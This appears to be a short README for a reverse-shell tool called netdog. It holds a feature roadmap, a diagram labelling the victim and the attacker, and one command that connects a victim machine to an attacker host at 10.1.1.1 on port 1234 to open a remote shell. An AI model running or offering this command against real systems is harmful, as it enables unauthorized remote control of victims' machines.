# Roadmap
- Reverse Shell
    - [ ] UDP
    - [ ] ICMP
    - [ ] Multi-sessions
    - [x] Auto reconnect
- Others
    - [ ] IPv6
    - [ ] HTTP/S Bind shell

# Reverse Shell
## TCP
```
+------------+            +------------+
|            |            |            |
|   victim   +------------>  attacker  |
|  (netdog)  |            |  10.1.1.1  |
|            |            |            |
+------------+            +------------+
```
```bash
./nd -host 10.1.1.1 # connect to attacker port 1234
```